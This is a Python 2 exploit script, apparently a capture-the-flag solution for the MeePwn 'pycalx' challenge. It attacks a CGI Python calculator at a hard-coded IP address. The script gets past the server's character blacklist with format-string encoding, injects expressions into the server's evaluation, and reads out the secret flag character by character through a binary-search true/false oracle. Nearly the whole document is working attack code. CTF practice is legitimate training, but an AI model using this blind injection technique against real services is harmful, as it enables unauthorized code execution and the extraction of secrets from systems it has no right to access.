import requests
import string
from urllib import urlencode

# This is the script mentioned in pycalx_both. I didn't get the flag by this because of length limit.

sess = requests.Session()
url = 'http://178.128.96.203/cgi-bin/server.py?'
blacklist = ['(',')','[',']','\'','"', '%']

keys = str(bytearray(range(32, 127))).replace('%', '')
for c in blacklist:
	keys = keys.replace(c, '')
flag = 'MeePwnCTF{python3.66666666666666_([_((you_passed_'
genstr = ''
genstr2 = ''
for c in flag:
	if c in blacklist:
		genstr = genstr.replace('%', '%%') + '%c'
		genstr2 = '%' + str(ord(c)) + genstr2
	else:
		genstr += c

flag = genstr

def next_char(flag, c):
	if c in blacklist:
		return flag.replace('%', '%%') + '%c', '+value1%' + str(ord(c)) + genstr2
	else:
		return flag + c, '+value1' + genstr2

while True:
	start = 0
	end = len(keys)
	while start < end:
		mid = (start + end) / 2
		c = keys[mid]
		print start, end, mid, c,
		s1, s2 = next_char(flag, c)
		r = sess.get(url + urlencode({
			'value1': s1,
			'value2': s2 + '<value1+FLAG#',
			'op': '+\''
			}))
		result = r.text.split('\n')[-3]
		print `result`
		if result == 'True':
			start = mid + 1
		elif result == 'False':
			r = sess.get(url + urlencode({
				'value1': s1,
				'value2': s2 + '>value1+FLAG#',
				'op': '+\''
				}))
			result = r.text.split('\n')[-3]
			print '>>', `result`
			if result == 'True':
				end = mid - 1
				print start, end
			else:
				c = keys[mid - 1]
				break
		else:
			print 'wtf'
			exit()
	c = keys[(start + end) / 2]
	if c in blacklist:
		flag = flag.replace('%', '%%') + '%c'
		genstr2 = '%' + str(ord(c)) + genstr2
	else:
		flag += c
	print 'Flag:', eval(`flag` + genstr2)
